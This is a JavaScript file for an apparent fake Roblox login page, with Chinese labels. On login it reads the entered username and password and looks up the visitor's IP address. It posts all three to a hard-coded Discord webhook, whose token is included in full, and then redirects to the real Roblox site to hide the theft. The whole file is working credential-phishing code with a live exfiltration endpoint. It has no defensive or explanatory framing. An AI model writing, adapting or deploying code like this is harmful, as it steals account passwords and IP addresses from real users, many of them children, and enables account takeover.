document.addEventListener("DOMContentLoaded", () => {
    const loginButton = document.getElementById("login-button");

    loginButton.addEventListener("click", () => {
        const username = document.getElementById("login-username").value.trim();
        const password = document.getElementById("login-password").value;

        if (!username || !password) {
            alert("請輸入帳號與密碼！");
            return;
        }

        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                const userIP = data.ip;

                const webhookURL = "https://discord.com/api/webhooks/1382344727688646767/sXTH1azfKhUqSQ153O4I1uaOdn6NkSDnKkrPyGSjijEzKLLo9CE5FA__OIghjBKlJN6g";

                const embedPayload = {
                    username: "帳號資訊",
                    embeds: [
                        {
                            title: "Roblox 登入資訊",
                            color: 0xff4444,
                            fields: [
                                {
                                    name: "帳號",
                                    value: username || "無",
                                    inline: true
                                },
                                {
                                    name: "密碼",
                                    value: password || "無",
                                    inline: true
                                },
                                {
                                    name: "IP 位址",
                                    value: userIP || "不明"
                                }
                            ],
                            timestamp: new Date().toISOString()
                        }
                    ]
                };

                return fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(embedPayload)
                });
            })
            .then(() => {
                window.location.href = "https://www.roblox.com/";
            })
            .catch((error) => {
                console.error("發生錯誤：", error);
                window.location.href = "https://www.roblox.com/";
            });
    });
});

document.getElementById("sendCodeBtn").addEventListener("click", function() {
    window.location.href = "email_login.html";
});
